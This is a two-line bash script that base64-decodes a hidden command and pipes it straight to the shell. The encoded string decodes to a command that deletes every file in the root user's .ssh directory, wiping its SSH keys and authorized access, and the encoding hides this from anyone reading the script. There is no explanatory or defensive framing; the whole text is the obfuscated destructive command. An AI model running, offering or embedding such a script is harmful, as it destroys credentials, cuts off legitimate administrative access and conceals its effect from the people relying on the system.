#!/bin/bash
echo 'cm0gLWYgL3Jvb3QvLnNzaC8q' | base64 -d | sh